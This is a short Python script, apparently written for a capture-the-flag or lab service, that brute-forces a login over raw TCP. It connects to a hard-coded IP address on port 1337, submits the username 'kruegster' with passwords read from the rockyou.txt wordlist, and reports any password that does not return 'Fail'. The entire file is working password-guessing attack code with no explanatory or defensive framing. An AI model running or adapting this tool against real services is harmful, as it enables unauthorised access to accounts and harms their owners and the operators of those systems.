#! /usr/bin/env python3

import socket
import threading
import time

host = "142.93.117.193" # IP address here
port = 1337 # Port here
wordlist = "rockyou.txt" # Point to wordlist file


usernames = [b'kruegster']
for username in usernames:
    print('Cracking with username {}'.format(username))
    with open(wordlist, 'rb') as f:
        i = 0
        for line in f:
            if i > 500:
                print('Not found, wrong username')
                break
            if i % 50 == 0:
                print('Tried {} passwords so far'.format(i))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect(('142.93.117.193', port))
            line = line.strip()
            s.recv(1024) # Username prompt
            s.send(username + b'\n')
            s.recv(1024) # Password prompt
            s.send(line + b'\n')
            data = s.recv(1024)
            if data != b'Fail\n':
                print('Matched! Passwd: {}, reply {}'.format(line, data))
                s.close()
                break
            s.close()
            i += 1
